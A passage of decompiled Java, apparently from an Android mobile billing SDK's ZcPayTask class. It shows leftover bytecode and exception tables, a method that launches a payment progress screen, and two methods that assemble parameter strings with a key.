    //   389: goto -13 -> 376
    //   392: astore_1
    //   393: aload_0
    //   394: invokevirtual 603	com/upay/billing/engine/zcwap_u/ZcPayTask:reRequestZc	()V
    //   397: goto -21 -> 376
    //   400: aload_0
    //   401: ldc_w 532
    //   404: putfield 52	com/upay/billing/engine/zcwap_u/ZcPayTask:requestZcStr	Ljava/lang/String;
    //   407: goto -31 -> 376
    //   410: astore_1
    //   411: aload_0
    //   412: invokevirtual 603	com/upay/billing/engine/zcwap_u/ZcPayTask:reRequestZc	()V
    //   415: goto -39 -> 376
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	418	0	this	ZcPayTask
    //   16	338	1	localObject1	Object
    //   371	1	1	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   392	1	1	localIllegalStateException	IllegalStateException
    //   410	1	1	localIOException	java.io.IOException
    //   20	363	2	localObject2	Object
    //   357	7	3	str	String
    // Exception table:
    //   from	to	target	type
    //   0	353	371	org/apache/http/client/ClientProtocolException
    //   353	358	371	org/apache/http/client/ClientProtocolException
    //   362	368	371	org/apache/http/client/ClientProtocolException
    //   381	389	371	org/apache/http/client/ClientProtocolException
    //   400	407	371	org/apache/http/client/ClientProtocolException
    //   0	353	392	java/lang/IllegalStateException
    //   353	358	392	java/lang/IllegalStateException
    //   362	368	392	java/lang/IllegalStateException
    //   381	389	392	java/lang/IllegalStateException
    //   400	407	392	java/lang/IllegalStateException
    //   0	353	410	java/io/IOException
    //   353	358	410	java/io/IOException
    //   362	368	410	java/io/IOException
    //   381	389	410	java/io/IOException
    //   400	407	410	java/io/IOException
  }
  
  public void showProgressUi(Plan paramPlan, Trade paramTrade, String paramString1, String paramString2)
  {
    paramPlan = paramPlan.getLocalResourcePath(paramString1);
    if ((paramPlan != null) && (new File(paramPlan).exists())) {}
    for (paramPlan = Util.loadLocalText(paramPlan);; paramPlan = Util.loadAssetsText(this.mContext, paramString1 + ".json"))
    {
      UpayActivity.start(this.mContext, paramString1, paramPlan, 0, new ZcPayTask.1(this, paramTrade, paramString2));
      return;
    }
  }
  
  public String sign(String paramString1, String paramString2, String paramString3)
  {
    return "pid=" + paramString2 + "&svcid=" + paramString1 + "&key=" + paramString3;
  }
  
  public String sign_c(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    return "outTradeNo=" + paramString1 + "&paymentcodesms=" + paramString2 + "&timeStamp=" + paramString3 + "&key=" + paramString4;
  }
}
